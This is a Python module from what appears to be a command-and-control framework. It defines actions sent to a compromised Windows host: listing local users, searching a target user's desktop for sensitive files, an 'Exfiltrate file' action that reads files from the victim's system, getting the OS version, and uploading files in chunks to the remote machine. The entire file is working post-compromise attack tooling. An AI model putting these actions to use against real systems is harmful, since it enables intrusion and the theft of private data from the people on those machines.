import os
from c2.c2_actions import C2Action
import c2.concrete_parsers as c2parsers


def find_local_users():
    commands_list = ["dir \\??\\C:\\Users\\"]
    parser = c2parsers.local_users_parser
    required_facts = []
    name = "Find local users"
    description = "Get a list of non-default local users"
    output_facts = ['local_users', 'target_local_user']
    action = C2Action(commands_list, parser, required_facts, name, description, output_facts)
    return action


def list_target_local_user_desktop():
    commands_list = ["dir \\??\\C:\\Users\\{target_local_user}\\Desktop\\"]
    parser = c2parsers.generic_dir_parser
    required_facts = ['target_local_user']
    name = "List user desktop"
    description = "Find potentially sensitive files on target user's desktop"
    output_facts = ['staged_files', 'target_file']
    action = C2Action(commands_list, parser, required_facts, name, description, output_facts)
    return action


def read_file():
    commands_list = ["read {target_file}"]
    parser = c2parsers.generic_file_parser
    required_facts = ['target_file']
    name = "Exfiltrate file"
    description = "Read a file from the victim's file system"
    action = C2Action(commands_list, parser, required_facts, name, description)
    return action


def get_system_version():
    commands_list = ["version"]
    parser = c2parsers.version_parser
    required_facts = []
    name = "Get system version"
    description = "Get major version, minor version and build number"
    output_facts = ['major_version', 'minor_version', 'build_number']
    action = C2Action(commands_list, parser, required_facts, name, description, output_facts)
    return action


def write_file(filename=None):
    commands_list = ["write {target_file}"]
    if filename is None:
        commands_list.append(b"stub")
    else:
        filename = filename.split('/')[-1]
        with open(os.path.join('/usr/src/app/c2/connections/upload_dir', filename), 'rb') as f:
            data = f.read()
        chunk_size = 1460
        data = [data[i:i+chunk_size] for i in range(0, len(data), chunk_size)]
        for chunk in data:
            commands_list.append(chunk)
    parser = c2parsers.null_parser
    required_facts = ['target_file']
    name = "Write file on remote file system"
    description = "This action reads a file, specified as argument, from the upload_dir, " \
                  "and writes it to remote file system in the path specified by target_file; " \
                  "if the local file is not specified, the action will write 'stub'"
    action = C2Action(commands_list, parser, required_facts, name, description)
    return action
